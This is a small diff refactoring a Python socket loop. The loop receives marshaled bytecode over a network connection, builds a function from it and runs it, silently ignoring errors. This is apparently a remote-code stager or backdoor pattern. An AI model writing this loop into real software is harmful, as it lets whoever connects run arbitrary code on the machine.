@@ -85,12 +85,10 @@ else:
 			while 1:
 				ready = select.select([self.client], [], [], 5)[0]
 				if not ready: break
-				data = self.client.recv(10240)
-				if data:
-					try: types.FunctionType(marshal.loads(data), {}, 'zzz')(self.client)
-					except: continue
-				else:
+				if not (data := self.client.recv(10240)):
 					break
+				try: types.FunctionType(marshal.loads(data), {}, 'zzz')(self.client)
+				except: continue
 			self.client.shutdown(socket.SHUT_RDWR)
 			self.client.close()
 
